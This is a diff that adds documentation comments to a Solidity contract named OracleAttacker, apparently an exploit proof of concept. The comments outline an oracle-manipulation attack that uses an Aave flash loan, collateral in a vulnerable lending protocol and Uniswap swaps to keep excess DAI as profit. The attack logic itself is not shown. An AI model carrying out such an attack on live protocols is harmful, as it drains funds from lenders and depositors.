@@ -31,6 +31,17 @@ contract OracleAttacker {
         owner = msg.sender;
     }
 
+    /**
+     * @notice Initiates a flash loan from Aave to manipulate the oracle price
+     * @param flashLoanAmount The amount of DAI to borrow via flash loan
+     * @param collateralToDeposit The amount of ETH to deposit as collateral
+     *
+     * Requirements:
+     * - The contract must have enough ETH balance to deposit as collateral
+     * - The vulnerable lending protocol must have enough DAI liquidity to exploit
+     * - Uniswap pool must have sufficient liquidity for swaps
+     */
+
     function flash_loan(uint256 flashLoanAmount, uint256 collateralToDeposit) external {
         // Setup flash loan call
         address[] memory assets = new address[](1);
@@ -57,7 +68,7 @@ contract OracleAttacker {
     }
 
     /**
-     * @dev Flash loan callback - called by Aave during flash loan
+     * @notice Aave flash loan callback that executes the oracle manipulation attack
      *
      * Attack flow:
      * 1. Receive flash loan of DAI
@@ -67,6 +78,12 @@ contract OracleAttacker {
      * 5. Swap WETH → DAI to restore price
      * 6. Repay flash loan
      * 7. Keep excess DAI as profit
+     *
+     * @param amounts The amounts of each asset being flash borrowed
+     * @param premiums The fees to be paid for each asset
+     * @param initiator The address that initiated the flash loan (should be this contract)
+     * @param params Encoded parameters (contains collateralToDeposit amount)
+     * @return True Returns true to signal that the execution is successful
      */
 
     function executeOperation(
